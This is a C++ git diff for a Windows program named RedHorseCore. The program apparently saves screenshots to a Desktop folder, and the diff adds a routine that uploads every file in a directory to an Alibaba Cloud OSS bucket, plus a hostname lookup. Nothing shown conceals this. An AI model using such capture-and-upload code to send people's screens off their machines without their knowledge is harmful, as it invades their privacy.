@@ -3,6 +3,11 @@
 #include <codecvt>
 #include <locale>
 #include <filesystem>
+#include <alibabacloud/oss/OssClient.h>
+#include <string>
+#include <fstream>
+#include <Windows.h>
+#include <vector>
 
 namespace fs = std::filesystem;
 
@@ -72,7 +77,7 @@ namespace RedHorseCore {
         delete[] buf;
     }
 
-    void init() {
+    std::wstring getUserProfile() {
         std::wstring userProfile;
         DWORD size = GetEnvironmentVariable(L"USERPROFILE", NULL, 0);
         if (size > 0) {
@@ -80,7 +85,11 @@ namespace RedHorseCore {
             GetEnvironmentVariable(L"USERPROFILE", &userProfile[0], size);
         }
 
-        std::wstring screenshotPath = userProfile + L"\\Desktop\\screenshot";
+        return userProfile;
+    }
+
+    void init() {
+        std::wstring screenshotPath = getUserProfile() + L"\\Desktop\\screenshot";
         CreateDirectory(screenshotPath.c_str(), NULL);
     }
 
@@ -123,5 +132,58 @@ namespace RedHorseCore {
             std::cerr << "Error: " << e.what() << std::endl;
         }
 
+    }
+
+    void uploadFiles(const std::string& bucketName, const std::string& directory, const std::string& endpoint, const std::string& accessKeyId, const std::string& accessKeySecret) {
+        AlibabaCloud::OSS::InitializeSdk();
+
+        AlibabaCloud::OSS::ClientConfiguration conf;
+        AlibabaCloud::OSS::OssClient client(endpoint, accessKeyId, accessKeySecret, conf);
+
+        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
+            if (entry.is_regular_file()) {
+                std::string filePath = entry.path().string();
+                std::string objectName = entry.path().filename().string();
+
+                std::shared_ptr<std::iostream> content = std::make_shared<std::fstream>(filePath, std::ios::in | std::ios::binary);
+                if (!content->good()) {
+                    std::cerr << "Failed to open file: " << filePath << std::endl;
+                    continue;
+                }
+
+                auto outcome = client.PutObject(bucketName, objectName, content);
+                if (!outcome.isSuccess()) {
+                    std::cerr << "Failed to upload file: " << filePath << ". Error: " << outcome.error().Message() << std::endl;
+                }
+                else {
+                    std::cout << "Successfully uploaded file: " << filePath << std::endl;
+                }
+            }
+        }
+
+        AlibabaCloud::OSS::ShutdownSdk();
+    }
+
+    std::wstring getHostname() {
+        char hostname[256];
+        if (gethostname(hostname, sizeof(hostname)) == 0) {
+            // 成功获取主机名，将其转换为 std::wstring
+            return std::wstring(hostname, hostname + std::strlen(hostname));
+        }
+        else {
+            // 处理错误情况
+            std::cerr << "gethostname failed: " << strerror(errno) << std::endl;
+            return L""; // 返回空的宽字符串
+        }
+    }
+
+    std::string wstring_to_string(const std::wstring& wstr) {
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), nullptr, 0, nullptr, nullptr);
+        if (size_needed <= 0) return ""; // Handle error
+
+        std::vector<char> str(size_needed);
+        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), &str[0], size_needed, nullptr, nullptr);
+
+        return std::string(str.begin(), str.end());
     }
 }
